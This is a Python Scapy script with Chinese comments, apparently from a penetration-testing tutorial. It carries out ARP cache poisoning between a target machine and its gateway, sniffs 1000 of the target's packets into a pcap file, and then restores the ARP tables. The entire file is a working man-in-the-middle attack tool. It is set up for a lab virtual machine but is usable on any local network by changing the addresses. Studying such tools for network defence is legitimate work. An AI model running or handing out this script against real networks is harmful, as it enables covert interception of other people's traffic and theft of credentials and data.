#-*- coding:utf8 -*-

from scapy.all import *
import os
import sys
import threading
import signal

interface   = "eth0"    #要嗅探的网卡
target_ip   = "10.10.10.140"        #目标ip,这里测试的是另外一台虚拟机winxp
gateway_ip  = "10.10.10.2"        #网关ip，这里是虚拟机的网关
packet_count = 1000

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

    # 以下代码调用send函数的方式稍有不同
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # 发出退出信号到主线程
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):

    # srp函数（发送和接收数据包，发送指定ARP请求到指定IP地址,然后从返回的数据中获取目标ip的mac）
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    #　返回从响应数据中获取的MAC地址
    for s,r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):

    # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
    # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
    poison_target = ARP()
    poison_target.op = 2                # 响应报文
    poison_target.psrc = gateway_ip     # 模拟是网关发出的, 其实是我们的机器发出的
    poison_target.pdst = target_ip      # 目的地是目标机器
    poison_target.hwdst = target_mac    # 目标的物理地址是目标机器的mac

    # 构建欺骗网关的ARP请求()，这里没设置hwsrc,默认就是本机咯
    poison_gateway = ARP()
    poison_gateway.op = 2               # 响应报文
    poison_gateway.psrc = target_ip     # 模拟是目标机器发出的,
    poison_gateway.pdst = gateway_ip    # 目的地是网关
    poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac

    print "[*] Beginning the ARP poison. ［CTRL_C to stop］"

    while True:
        try:
            # 开始发送ARP欺骗包(投毒)
            send(poison_target)
            send(poison_gateway)
            # 停两秒
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print "[*] ARP poison attack finished"
    return





# 设置嗅探的网卡
conf.iface = interface

# 关闭输出
conf.verb = 0

print "[*] Setting up %s" % interface

# 获取网关mac
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting"
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

# 获取目标(被攻击的机器)mac
target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting"
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip, target_mac)

# 启动ARP投毒（欺骗）线程
poison_thread = threading.Thread(target = poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_filter = "ip host %s " % target_ip  # 过滤器
    packets = sniff(count = packet_count, filter=bpf_filter, iface = interface)

    # 将捕获到的数据包输出到文件
    wrpcap("arper.pcap", packets)
    # 还原网络配置
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    # 还原网络配置
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
